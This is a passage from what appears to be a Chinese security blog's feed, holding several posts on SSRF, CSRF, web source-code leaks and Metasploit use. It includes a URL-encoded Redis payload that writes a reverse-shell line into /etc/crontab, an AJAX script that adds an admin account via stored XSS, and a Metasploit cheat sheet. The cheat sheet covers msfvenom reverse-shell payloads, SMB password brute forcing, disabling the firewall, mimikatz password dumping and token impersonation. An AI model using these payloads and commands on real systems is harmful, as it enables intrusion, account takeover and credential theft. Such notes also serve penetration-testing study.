<p>进行url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ssrf-w2.png" alt=""></p>
<p>反弹shell</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ssrf-w.png" alt=""></p>
<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
<ul>
<li>/etc/crontab 这个是肯定的</li>
<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">利用 gopher 协议拓展攻击面</a><br><a href="https://github.com/phith0n/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="external">vulhub/weblogic/ssrf</a><br><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="external">腾讯某处SSRF漏洞(非常好的利用点)附利用脚本</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>CSRF漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/CSRF漏洞的利用与学习.html</id>
    <published>2017-07-14T02:50:29.000Z</published>
    <updated>2017-07-14T07:04:36.915Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h2><p>发现漏洞可利用处-&gt;构造(搭建)搭建代码-&gt;发送给用户(管理员)-&gt;触发代码(发送请求)………</p>
<p>从这个利用的一个流程中，我们可以发现,攻击者仅仅只是做了两处工作.第一处是:发现漏洞利用处，，第二处就是构造利用代码以及发送至用户(管理员)。至于利用，你会发现CSRF与XSS不同，XSS是攻击者自己提交，等待结果，而CSRF呢，是由用户(管理员)自身提交。甚至可以说攻击者只做了构造代码的工作。</p>
<h2 id="OWASP-CSRFTester"><a href="#OWASP-CSRFTester" class="headerlink" title="OWASP CSRFTester"></a>OWASP CSRFTester</h2><p>这是OWASP推出的CSRF半自动化软件，他省去了CSRF最繁琐的过程，代码构造。下面是软件的截图‍‍</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF1.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF2.jpg" alt=""></p>
<h2 id="利用CSRFTester进行CSRF攻击"><a href="#利用CSRFTester进行CSRF攻击" class="headerlink" title="利用CSRFTester进行CSRF攻击"></a>利用CSRFTester进行CSRF攻击</h2><p>进入已经搭建的CMS后台的管理员管理模块</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF3.jpg" alt=""></p>
<p>浏览器里代理设置为CSRFTester的代理127.0.0.1：8008</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF4.jpg" alt=""></p>
<p>开启CSRFTester抓取数据包，正常添加管理员 返回可以看到已经抓取到了数据包<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF5.jpg" alt=""></p>
<p>在Form Parameters中没有找到token的值，那么就可以实现CSRF攻击</p>
<p>在Report Type中。有四种方法来进行攻击。‍‍</p>
<ul>
<li>‍‍Forms：创建一个form表单。内容为hidden(隐藏)，用户不可见（可POST、GET）‍‍<br>‍‍<em>    iFrame：创建一个iframe框架，高宽为0，用户不可见。（可POST、GET）‍‍<br>‍‍</em>    IMG：创建一个IMG标签(只能GET)。‍‍<br>‍‍<em>    XHR：创建一个AJAX请求(可POST、GET)‍‍<br>‍‍</em>    Link：创建一个a标签的超链接(只能GET)</li>
</ul>
<p>此处先选择Forms进行测试</p>
<p>点击Generate HTML 便生成了一个index.html</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF6.jpg" alt=""></p>
<p>由其中的HTML源码可以看出这是一个简单的提交表单，点击运行这个html文件<br>可以看到成功的添加了一个管理员用户</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF7.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF8.jpg" alt=""></p>
<p>到此利用CSRFTester进行CSRF攻击成功</p>
<h2 id="构造提交表单进行CSRF攻击"><a href="#构造提交表单进行CSRF攻击" class="headerlink" title="构造提交表单进行CSRF攻击"></a>构造提交表单进行CSRF攻击</h2><p>审查元素得到管理员管理的URL，进入查看源码。分析提交表单</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF9.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF10.jpg" alt=""></p>
<p>修改提交表单</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF11.jpg" alt=""></p>
<p>点击按钮提交，成功添加管理员<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF12.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF13.jpg" alt=""></p>
<p>在html中增加javascript脚本，自动提交表单<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF14.jpg" alt=""></p>
<h2 id="利用ajax结合xss进行CSRF攻击"><a href="#利用ajax结合xss进行CSRF攻击" class="headerlink" title="利用ajax结合xss进行CSRF攻击"></a>利用ajax结合xss进行CSRF攻击</h2><p>就是把CSRF的AJAX请求放到XSS里，以达到攻击的效果</p>
<p>在测试用的这套CMS的留言板处就存在存储型XSS漏洞</p>
<p>在这里我们可以使用CSRFTester生成一个ajax</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF15.jpg" alt=""></p>
<p>我们可以看到ajax中核心部分<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF16.jpg" alt=""></p>
<p>同时也可以自己编写一个简单的ajax</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">var xmlhttp;</div><div class="line">if(window.XMLHttpRequest)&#123;</div><div class="line">  xmlhttp=new XMLHttpRequest();</div><div class="line">  &#125;else&#123;</div><div class="line">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">  &#125;</div><div class="line">xmlhttp.open(&quot;POST&quot;,&quot;/admin/admin_manage.asp?act=add&quot;,true);</div><div class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">xmlhttp.send(&quot;admin=789&amp;password=789&amp;password3=789&amp;button=提交数据&quot;);</div></pre></td></tr></table></figure>
<p>在xss平台上配置项目<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF17.jpg" alt=""></p>
<p>然后插入测试网站的留言板里<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF18.jpg" alt=""></p>
<p>管理员查看留言信息就能添加一个管理员账号了<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF19.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF20.jpg" alt=""></p>
<h2 id="CSRF-漏洞防护"><a href="#CSRF-漏洞防护" class="headerlink" title="CSRF 漏洞防护"></a>CSRF 漏洞防护</h2><p>其实现在有关CSRF漏洞防护已经是比较成熟了，其主要防护的思路就是需要在进行后台数据修改操作的过程中，添加对当前用户身份的有效验证措施，而不能仅限于cookie的识别，这里简单的罗列了下防护措施如下。</p>
<p>（1） 来源校验</p>
<p>使用http请求头中referer来源，对客户端源进行身份校验，此方法早期使用比较多，但是仍然容易被绕过，所以这里并不建议使用。</p>
<p>（2） 用户token 校验</p>
<p>添加基于当前用户身份的有效tokens随机验证机制，即在向后端提交数据操作请求时，添加基于当前用户的随机token校验值，此种校验方法当前使用比较多；</p>
<p>（3）当前用户密码验证</p>
<p>在修改关键信息时，要钱当前用户输入其自身的密码，以验证当前用户身份的真伪，防止未授权的恶意操作；</p>
<p>（4）添加验证机制</p>
<p>在请求数据的提交前，需填写验证码信息提交，以增加对用户来源的有效验证，防止恶意未授权的操作产生。</p>
<p>参考链接：<br><a href="http://www.test404.com/post-1410.html" target="_blank" rel="external">http://www.test404.com/post-1410.html</a><br><a href="http://www.freebuf.com/articles/web/55965.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/55965.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>常见Web源码泄露总结</title>
    <link href="http://uknowsec.cn/posts/ctf/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/ctf/常见Web源码泄露总结.html</id>
    <published>2017-07-14T01:49:47.000Z</published>
    <updated>2017-07-14T02:00:20.346Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p>
<h2 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h2><h3 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h3><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>hg init的时候会生成.hg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
<h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-hg.pl -v -u http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
<h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h4 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g. http://www.example.com/.git/config</div></pre></td></tr></table></figure></p>
<h4 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack.py http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-git.pl -v -u http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
<h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h4><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.example.com/.ds_store</div></pre></td></tr></table></figure>
<p>注意路径检查</p>
<p>工具：</p>
<p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">dsstoreexp</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ds_store_exp.py http://www.example.com/.DS_Store</div></pre></td></tr></table></figure></p>
<h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<h4 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害:"></a>漏洞成因及危害:</h4><p>该漏洞的成因主要有以下两种：</p>
<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测:"></a>漏洞检测:</h4><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure></p>
<h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</div></pre></td></tr></table></figure>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-svn.pl -v -u http://www.example.com/.svn/</div></pre></td></tr></table></figure>
<p>Seay-Svn</p>
<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<ul>
<li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
<li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
<li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li>
<li>/WEB-INF/database.properties：数据库配置文件<h4 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4></li>
</ul>
<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p>漏洞检测以及利用方法：</p>
<p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。<br>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
<h3 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>测试的目录</p>
<ul>
<li><a href="http://url/CVS/Root" target="_blank" rel="external">http://url/CVS/Root</a> 返回根信息</li>
<li><a href="http://url/CVS/Entries" target="_blank" rel="external">http://url/CVS/Entries</a> 返回所有文件的结构<br>取回源码的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk clone http://url/name dir</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
<p>查看所有的改变的命令，转到download的目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bk changes</div><div class="line">Bazaar/bzr</div></pre></td></tr></table></figure></p>
<p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</div></pre></td></tr></table></figure></p>
<p>工具推荐</p>
<p>Bitkeeper<br>weakfilescan</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21296806</a><br><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="external">http://www.s2.sshz.org/post/source-code-leak/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>Metasploit Framework 利用总结</title>
    <link href="http://uknowsec.cn/posts/skill/Meatsploit-Framework-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/skill/Meatsploit-Framework-利用总结.html</id>
    <published>2017-07-13T04:15:40.000Z</published>
    <updated>2017-09-05T15:52:41.078Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="msfvenom-Payload-List"><a href="#msfvenom-Payload-List" class="headerlink" title="msfvenom Payload List"></a>msfvenom Payload List</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div></pre></td></tr></table></figure>
<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div></pre></td></tr></table></figure>
<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure>
<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure>
<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
<h2 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD &lt;Payload name&gt;</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORT &lt;LPORT value&gt;</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j -z</div></pre></td></tr></table></figure>
<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/portscan/tcp</div><div class="line">show options</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORTS &lt;LPORT value&gt;</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon2.jpg" alt=""></p>
<h2 id="Windows-Smb模块"><a href="#Windows-Smb模块" class="headerlink" title="Windows Smb模块"></a>Windows Smb模块</h2><h3 id="扫描smb判断主机"><a href="#扫描smb判断主机" class="headerlink" title="扫描smb判断主机"></a>扫描smb判断主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_version</div><div class="line">show options</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon3.jpg" alt=""></p>
<h3 id="爆破smb密码"><a href="#爆破smb密码" class="headerlink" title="爆破smb密码"></a>爆破smb密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_login</div><div class="line">set SMBUser administrator</div><div class="line">set PASS_FILE /tmp/pass</div><div class="line">set RHOSTS 192.168.1.116</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon4.jpg" alt=""></p>
<h3 id="开启3389远程桌面"><a href="#开启3389远程桌面" class="headerlink" title="开启3389远程桌面"></a>开启3389远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run post/windows/manage/enable_rdp</div></pre></td></tr></table></figure>
<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">shell</div><div class="line">netsh adcfirewall set allprofiles state off</div></pre></td></tr></table></figure>
<h3 id="实时截图"><a href="#实时截图" class="headerlink" title="实时截图"></a>实时截图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">screenshot</div><div class="line">use espia</div></pre></td></tr></table></figure>
<h3 id="meterpreter加载mimikatz抓取明文密码"><a href="#meterpreter加载mimikatz抓取明文密码" class="headerlink" title="meterpreter加载mimikatz抓取明文密码"></a>meterpreter加载mimikatz抓取明文密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon1.jpg" alt=""></p>
<h3 id="窃取及伪造域账户-token"><a href="#窃取及伪造域账户-token" class="headerlink" title="窃取及伪造域账户 token"></a>窃取及伪造域账户 token</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">load incognito</div><div class="line">list_tokens -u</div><div class="line">impersonate_token xxxxx\\xxxxxxx</div><div class="line">execute -f cmd.exe -i -t</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon6.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
